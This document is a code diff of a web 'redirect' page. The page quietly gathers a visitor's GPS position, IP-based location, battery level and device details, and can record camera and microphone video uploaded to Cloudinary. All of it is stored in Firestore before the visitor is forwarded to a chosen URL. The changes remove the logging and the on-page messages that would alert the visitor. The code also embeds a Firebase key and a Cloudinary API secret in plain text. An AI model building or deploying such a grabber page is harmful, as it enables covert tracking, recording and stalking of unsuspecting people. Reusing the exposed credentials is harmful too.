@@ -74,8 +74,7 @@
     <!-- Firebase SDK (Firestore) -->
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
-    <!-- Firebase SDK (Storage) -->
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage-compat.js"></script>
+    <!-- Firebase SDK (Storage) --><!-- REMOVED: No longer needed -->
     <!-- Cloudinary Upload Widget (Not needed) -->
     <script src="https://widget.cloudinary.com/v2.0/global/all.js" type="text/javascript"></script>
 </head>
@@ -91,12 +90,12 @@
     </div>
 
 <script>
-// --- Firebase Config (YOUR ACTUAL CONFIG) ---
+// --- Firebase Config ---
 const firebaseConfig = {
     apiKey: "AIzaSyAjuJwrh-OUScGf1tnsYNB9awV9gkg45QA",
     authDomain: "loctrac-8d7ef.firebaseapp.com",
     projectId: "loctrac-8d7ef",
-    storageBucket: "loctrac-8d7ef.firebasestorage.com",
+    storageBucket: "loctrac-8d7ef.firebasestorage.com",  //  Still in config, but unused
     messagingSenderId: "34491549339",
     appId: "1:34491549339:web:c666c4f8f3271bab06e83e",
     measurementId: "G-65PYC8E9VR",
@@ -106,19 +105,19 @@ const firebaseConfig = {
 // Initialize Firebase
 const app = firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
-const storage = firebase.storage(); // Firebase storage, still needed for potential image uploads
+//const storage = firebase.storage(); // REMOVED: No longer needed
 
 const errorMessage = document.getElementById("error-message");
-const themeIconElement = document.getElementById('theme-icon'); // Icon Element
-const customRedirectTextElement = document.getElementById('custom-redirect-text'); // Custom Text Element
+const themeIconElement = document.getElementById('theme-icon');
+const customRedirectTextElement = document.getElementById('custom-redirect-text');
 
 // Cloudinary configuration
-const cloudName = "loctrac"; // Replace with your Cloudinary cloud name
-const uploadPreset = "locstorage"; //  Replace with your Cloudinary upload preset.  *IMPORTANT*
+const cloudName = "loctrac";
+const uploadPreset = "loctrac"; // Corrected upload preset
 const apiKey = "811393725393156";
-const apiSecret = "kUg-q5QY1UsLastxfxLKu_cKjSQ";
+const apiSecret = "kUg-q5QY1UsLastxfxLKu_cKjSQ"; //  Not directly used, but good to keep
 
-// --- Theme Definitions (Default Themes) ---
+// --- Theme Definitions ---
 const themes = {
     default: {
         bodyBackgroundColor: '#f3f7fa',
@@ -134,27 +133,27 @@ const themes = {
         tableTitleBorderColor: '#007bff',
     },
     dark: {
-        bodyBackgroundColor: '#121212', /* Dark background */
+        bodyBackgroundColor: '#121212',
         containerBackgroundColor: '#1e1e1e',
-        containerBoxShadow: '0 8px 16px rgba(255, 255, 255, 0.1)', /* Light shadow for dark theme */
-        headingColor: '#00a86b', /* Example accent color */
-        textColor: '#f8f8f8', /* Light text */
+        containerBoxShadow: '0 8px 16px rgba(255, 255, 255, 0.1)',
+        headingColor: '#00a86b',
+        textColor: '#f8f8f8',
         buttonBackgroundColor: '#00a86b',
         buttonHoverBackgroundColor: '#007a55',
-        tableHeaderBackgroundColor: '#333', /* Darker header */
+        tableHeaderBackgroundColor: '#333',
         tableHeaderColor: '#f8f8f8',
         tableBorderColor: '#555',
         tableTitleBorderColor: '#00a86b',
     },
     green: {
-        bodyBackgroundColor: '#e8f5e9', /* Light green background */
+        bodyBackgroundColor: '#e8f5e9',
         containerBackgroundColor: '#ffffff',
         containerBoxShadow: '0 8px 16px rgba(0, 0, 0, 0.1)',
-        headingColor: '#4caf50', /* Green heading */
+        headingColor: '#4caf50',
         textColor: '#333',
         buttonBackgroundColor: '#4caf50',
         buttonHoverBackgroundColor: '#43a047',
-        tableHeaderBackgroundColor: '#f1f8e9', /* Lighter green header */
+        tableHeaderBackgroundColor: '#f1f8e9',
         tableHeaderColor: '#333',
         tableBorderColor: '#c8e6c9',
         tableTitleBorderColor: '#4caf50',
@@ -169,11 +168,10 @@ async function getCurrentUserId() {
       if (counterDoc.exists) {
         return `user${counterDoc.data().count}`;
       } else {
-         return 'user1'; // Initial value. Should not normally happen
+         return 'user1';
       }
 }
 
-// Utility function to promisify Geolocation API
 function getCurrentPositionPromise() {
     return new Promise((resolve, reject) => {
         if (navigator.geolocation) {
@@ -184,7 +182,6 @@ function getCurrentPositionPromise() {
     });
 }
 
- // Utility function to promisify Battery API
 function getBatteryPromise() {
     return new Promise((resolve, reject) => {
         if(navigator.getBattery) {
@@ -195,8 +192,7 @@ function getBatteryPromise() {
     });
 }
 
- // TIP: Function to fetch IP Location Data
- async function getIPLocationData() {
+async function getIPLocationData() {
     try {
         const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
@@ -215,17 +211,15 @@ function getBatteryPromise() {
     }
 }
 
-// Utility function to get device info
 function getDeviceInfo() {
     return navigator.userAgent;
 }
 
-// Function to apply theme on redirect page (now handles both default and custom themes)
 async function applyThemeRedirect(themeName) {
-    let themeConfig = themes[themeName]; // Check if it's a default theme
+    let themeConfig = themes[themeName];
     let customThemeData = null;
 
-    if (!themeConfig) { // If not a default theme, try to load custom theme
+    if (!themeConfig) {
         const customThemeRef = db.collection('redirectThemes').doc(themeName);
         const doc = await customThemeRef.get();
         if (doc.exists) {
@@ -234,24 +228,22 @@ async function applyThemeRedirect(themeName) {
     }
 
     if (customThemeData) {
-        // Apply custom theme styles
-        document.body.style.backgroundColor = customThemeData.backgroundImageUrl ? `url('${customThemeData.backgroundImageUrl}')` : '#f3f7fa'; // Default background if no image
-        document.body.style.color = '#333'; // Default text color, can be customized in themeData later if needed
+        document.body.style.backgroundColor = customThemeData.backgroundImageUrl ? `url('${customThemeData.backgroundImageUrl}')` : '#f3f7fa';
+        document.body.style.color = '#333';
         const container = document.querySelector('.container');
         if (container) {
-            container.style.backgroundColor = 'white'; // Or customize if needed
-            container.style.boxShadow = '0 8px 16px rgba(0, 0, 0, 0.1)'; // Or customize
+            container.style.backgroundColor = 'white';
+            container.style.boxShadow = '0 8px 16px rgba(0, 0, 0, 0.1)';
         }
         const h1 = document.querySelector('h1');
         if (h1) {
-            h1.style.color = '#007bff'; // Or customize
+            h1.style.color = '#007bff';
         }
          const p = document.querySelectorAll('p');
         p.forEach(pElement => {
-            pElement.style.color = '#333'; // Or customize
+            pElement.style.color = '#333';
         });
 
-        // Handle icon and custom text for custom theme
         if (customThemeData.iconImageUrl) {
             themeIconElement.src = customThemeData.iconImageUrl;
             themeIconElement.style.display = 'block';
@@ -264,10 +256,7 @@ async function applyThemeRedirect(themeName) {
         } else {
             customRedirectTextElement.style.display = 'none';
         }
-
-
     } else if (themeConfig) {
-        // Apply default theme styles as before
         document.body.style.backgroundColor = themeConfig.bodyBackgroundColor;
         document.body.style.color = themeConfig.textColor;
         const container = document.querySelector('.container');
@@ -283,17 +272,14 @@ async function applyThemeRedirect(themeName) {
         p.forEach(pElement => {
             pElement.style.color = themeConfig.textColor;
         });
-        themeIconElement.style.display = 'none'; // Hide icon for default themes
-        customRedirectTextElement.style.display = 'none'; // Hide custom text for default themes
+        themeIconElement.style.display = 'none';
+        customRedirectTextElement.style.display = 'none';
 
     } else {
-        // Fallback to default theme if themeName is not found and not a custom theme
         applyThemeRedirect('default');
     }
 }
 
-
-// Function to collect other data
 async function collectOtherData(locationPermission, currentVideoUrl, currentCameraError) {
     let locationData = null;
     let batteryData = null;
@@ -310,66 +296,33 @@ async function collectOtherData(locationPermission, currentVideoUrl, currentCame
                 longitude: position.coords.longitude,
                 accuracy: position.coords.accuracy
             };
-            console.log("Location data:", locationData);
         } catch (error) {
-            console.error("Error getting location:", error);
             let errorMsg = "";
             switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    errorMsg = "Gebruiker heeft locatietoestemming geweigerd.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                   errorMsg = "Locatie informatie is niet beschikbaar.";
-                    break;
-                case error.TIMEOUT:
-                   errorMsg = "De aanvraag voor locatie duurde te lang.";
-                    break;
-                case error.UNKNOWN_ERROR:
-                    errorMsg = "Er is een onbekende fout opgetreden bij het ophalen van de locatie.";
-                    break;
-                default:
-                    errorMsg = error.message;
+                case error.PERMISSION_DENIED:       errorMsg = "Gebruiker heeft locatietoestemming geweigerd."; break;
+                case error.POSITION_UNAVAILABLE:    errorMsg = "Locatie informatie is niet beschikbaar.";           break;
+                case error.TIMEOUT:                 errorMsg = "De aanvraag voor locatie duurde te lang.";          break;
+                case error.UNKNOWN_ERROR:           errorMsg = "Er is een onbekende fout opgetreden.";               break;
+                default:                            errorMsg = error.message;
             }
             locationError = errorMsg;
-             console.error("Location error:", locationError);
-
-             ipLocationData = await getIPLocationData();
-             if(ipLocationData){
-                 console.log("IP Location data (fallback):", ipLocationData);
-             } else {
-                 console.error("Failed to get IP location fallback as well.");
-             }
-
-            }
+            ipLocationData = await getIPLocationData();
+        }
     } else {
          ipLocationData = await getIPLocationData();
-         if(ipLocationData){
-             console.log("IP Location data (no GPS permission needed):", ipLocationData);
-         } else {
-             console.error("Failed to get IP location even when GPS permission not needed.");
-         }
     }
 
-
-    // 3. Battery
     if (navigator.getBattery) {
         try{
             const battery = await getBatteryPromise();
             batteryData = battery.level * 100;
-            console.log("Battery data:", batteryData);
-
         }catch(error){
-          console.error("Error getting batter:", error);
           batteryError = error.message;
-          console.error("Battery error: ", batteryError);
         }
     }
-
-    // All data collected (or errors stored), now save and redirect
     saveDataAndRedirect(currentVideoUrl, locationData, batteryData, locationError, batteryError, currentCameraError, ipLocationData, deviceInfo);
 }
 
-// Function to handle camera/microphone permissions and recording (if needed)
 async function handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId) {
     let videoUrl = null;
     let cameraError = null;
@@ -395,10 +348,9 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                       // Cloudinary upload
                       const formData = new FormData();
                       formData.append('file', blob, `${currentUserId}_recording.webm`);
-                      formData.append('upload_preset', uploadPreset); //  Use the upload preset
-                      formData.append('cloud_name', cloudName);      // Add cloud_name
-                      //formData.append('api_key', apiKey); // API key is *NOT* secret, can be included for unsigned uploads
-                      // No signature needed for unsigned uploads with an upload preset
+                      formData.append('upload_preset', uploadPreset);
+                      formData.append('cloud_name', cloudName);
+                      //formData.append('api_key', apiKey); //  Optional for unsigned
 
                       const uploadResponse = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/video/upload`, {
                         method: 'POST',
@@ -408,20 +360,16 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                       if (!uploadResponse.ok) {
                           const errorData = await uploadResponse.json();
                           cameraError = `Cloudinary upload error: ${uploadResponse.status} - ${errorData.error.message}`;
-                          console.error(cameraError);
                           videoUrl = null;
                           collectOtherData(true, videoUrl, cameraError);
                           return;
                       }
 
                     const uploadResult = await uploadResponse.json();
-                    videoUrl = uploadResult.secure_url; // Use secure_url from Cloudinary response
-                    console.log("Cloudinary Upload Result:", uploadResult);
+                    videoUrl = uploadResult.secure_url;
                     collectOtherData(true, videoUrl, cameraError);
 
-
                   } catch (uploadError) {
-                        console.error("Cloudinary upload error:", uploadError);
                         cameraError = `Cloudinary upload error: ${uploadError.message}`;
                          videoUrl = null;
                         collectOtherData(true, videoUrl, cameraError);
@@ -430,7 +378,6 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                         stream.getTracks().forEach(track => track.stop());
                     }
                   }
-
                 };
 
                 recorder.start();
@@ -441,32 +388,24 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                 }, recordSeconds * 1000);
 
             } else {
-                // No recording needed, but still need to stop the stream.
                 if (stream) {
                     stream.getTracks().forEach(track => track.stop());
                 }
-                collectOtherData(true, null, null);  // No video, no camera error.
+                collectOtherData(true, null, null);
             }
         } catch (error) {
-            console.error("Error accessing camera/microphone:", error);
             cameraError = error.message;
-            collectOtherData(true, null, cameraError); // No video, but camera error
+            collectOtherData(true, null, cameraError);
         }
     } else {
-        // No camera permission.  Still collect other data
-        collectOtherData(false, null, null); // No location perm, no video, no camera error
+        collectOtherData(false, null, null);
     }
-
-    return { videoUrl, cameraError }; // Return values
+    return { videoUrl, cameraError };
 }
 
-
-// Function to save data to Firestore and perform the redirect
 async function saveDataAndRedirect(videoUrl, locationData, batteryData, locationError, batteryError, cameraError, ipLocationData, deviceInfo) {
-    console.log("saveDataAndRedirect called. videoUrl:", videoUrl); // <-- ADDED - VERY IMPORTANT
-
     const dataToSave = {
-        videoUrl: videoUrl || null, // Make sure videoUrl is included.  Use || null to handle undefined.
+        videoUrl: videoUrl || null,
         location: locationData || null,
         batteryPercentage: batteryData,
         locationError: locationError || null,
@@ -476,21 +415,16 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
         deviceInfo: deviceInfo || null,
     };
 
-    console.log("dataToSave:", dataToSave); // <-- ADDED
-
     const currentUserId = await getCurrentUserId();
     const dataRef = db.collection('userData').doc(currentUserId);
 
     try {
         await dataRef.set(dataToSave);
-        console.log("Data saved to Firestore!");
     } catch (error) {
-        console.error("Error saving data to Firestore:", error);
-         errorMessage.textContent = `Firestore Fout: ${error.message}`;
+        errorMessage.textContent = `Firestore Fout: ${error.message}`;
         errorMessage.style.display = 'block';
     }
 
-    // Perform the redirect - get redirect URL and notification settings
     const settingsRef = db.collection('userSettings').doc(currentUserId);
     const settingsSnap = await settingsRef.get();
     let redirectUrl = null;
@@ -512,66 +446,46 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
         themeName = settingsData.theme || 'default';
     }
 
-    await applyThemeRedirect(themeName); // Apply theme here (await to ensure theme is applied before redirect)
+    await applyThemeRedirect(themeName);
 
-
-    // --- Trigger Notification BEFORE redirect, ONLY if permission is enabled in settings ---
     if (notificationPermission && notificationTitle && notificationBody) {
         if (!("Notification" in window)) {
-            console.log("This browser does not support notifications.");
+            // No support
         } else if (Notification.permission === "granted") {
             try {
-                new Notification(notificationTitle, {
-                    body: notificationBody,
-                    icon: notificationIcon || undefined
-                });
-                console.log("Notification sent on redirect!");
+                new Notification(notificationTitle, { body: notificationBody, icon: notificationIcon || undefined });
             } catch (notificationError) {
-                console.error("Error sending notification on redirect:", notificationError);
+                console.error("Error sending notification:", notificationError);
             }
         } else if (Notification.permission === 'default') {
              Notification.requestPermission().then(permissionResult => {
                 if(permissionResult === 'granted'){
                     try {
-                        new Notification(notificationTitle, {
-                            body: notificationBody,
-                            icon: notificationIcon || undefined
-                        });
-                        console.log("Notification sent after permission granted!");
+                        new Notification(notificationTitle, { body: notificationBody, icon: notificationIcon || undefined });
                     } catch (notificationError) {
-                        console.error("Error sending notification after permission grant:", notificationError);
+                        console.error("Error sending notification:", notificationError);
                     }
-                } else {
-                    console.log("Notification permission not granted by user after prompt on redirect.");
                 }
             });
-
-        } else { // Notification.permission === 'denied'
-            console.log('Notification permission previously denied by user.');
         }
     }
 
-
     if (redirectUrl) {
-        setTimeout(() => {
-            window.location.href = redirectUrl;
-        }, redirectSeconds * 1000);
+        setTimeout(() => { window.location.href = redirectUrl; }, redirectSeconds * 1000);
     } else {
          errorMessage.textContent = "Fout: Geen doorverwijs-URL opgegeven.";
         errorMessage.style.display = 'block';
     }
 }
 
-// --- Start of Script Execution ---
 (async () => {
-    // Get the current user ID *before* fetching settings
     const currentUserId = await getCurrentUserId();
     const settingsRef = db.collection('userSettings').doc(currentUserId);
 
     let micCamPermission = false;
     let recordSeconds = 0;
     let notificationPermissionSetting = false;
-    let themeName = 'default'; // Default theme
+    let themeName = 'default';
 
     try {
         const settingsSnap = await settingsRef.get();
@@ -580,85 +494,37 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
             micCamPermission = settingsData.micCamPermission;
             recordSeconds = parseInt(settingsData.recordSeconds) || 0;
             notificationPermissionSetting = settingsData.notificationPermission;
-            themeName = settingsData.theme || 'default'; // Get theme name from settings
-        } else {
-            console.warn("No settings found in Firestore, using defaults.");
+            themeName = settingsData.theme || 'default';
         }
     } catch (error) {
-        console.error("Error fetching settings from Firestore:", error);
-        errorMessage.textContent = `Firebase Fout bij laden instellingen: ${error.message}`;
+        errorMessage.textContent = `Firebase Fout: ${error.message}`;
         errorMessage.style.display = 'block';
     }
 
-
-    // Apply theme FIRST
     await applyThemeRedirect(themeName);
 
-
-    // Request notification permission ONLY if enabled in settings
     if (notificationPermissionSetting) {
-        if (!("Notification" in window)) {
-            console.log("This browser does not support notifications.");
-        } else if (Notification.permission === "default") {
-            const permissionResult = await Notification.requestPermission();
-            if (permissionResult === 'granted') {
-                console.log("Notification permission granted on redirect (because enabled in settings)!");
-            } else if (permissionResult === 'denied') {
-                console.log("Notification permission denied on redirect (because enabled in settings, but user denied).");
-            } else {
-                console.log("Notification permission dismissed or ignored on redirect (because enabled in settings).");
-            }
-        } else if (Notification.permission === 'granted') {
-            console.log("Notification permission already granted (and enabled in settings).");
-        } else if (Notification.permission === 'denied') {
-            console.log("Notification permission already denied (even though enabled in settings).");
+        if (Notification.permission === "default") {
+            await Notification.requestPermission(); //  Request once
         }
-    } else {
-        console.log("Notification permission check skipped on redirect (because disabled in settings).");
     }
 
-
-    // 1. Request Location Permission FIRST (without confirm dialog)
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             async (position) => {
-                console.log("Location permission granted (browser prompt).");
-                // 2. If location granted, THEN request Camera/
                 const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
-                const { videoUrl, cameraError } = cameraMicData;
-
-                // Collect other data (battery, IP location) and redirect - location permission assumed granted here
-                collectOtherData(true, videoUrl, cameraError); // Pass true for location permission
-
-
+                collectOtherData(true, cameraMicData.videoUrl, cameraMicData.cameraError);
             },
             async (error) => {
-                console.error("Location permission denied or error (browser prompt):", error);
-                errorMessage.textContent = "Locatie toestemming geweigerd of fout (browser prompt).";
-                errorMessage.style.display = 'block';
-
-                // Still proceed to collect other data (battery, IP location) without GPS location, and redirect
                 const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
-                const { videoUrl, cameraError } = cameraMicData;
-                collectOtherData(false, videoUrl, cameraError); // Pass false for location denied
+                collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError);
             },
-            {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            }
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
     } else {
-        console.error("Geolocation is not supported by this browser.");
-        errorMessage.textContent = "Locatie niet ondersteund door browser.";
-        errorMessage.style.display = 'block';
-        // Proceed to camera/mic and other data collection even if geolocation is not supported
         const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
-        const { videoUrl, cameraError } = cameraMicData;
-        collectOtherData(false, videoUrl, cameraError); // Pass false for location not available
+        collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError);
     }
-
-
 })();
 </script>
 </body>
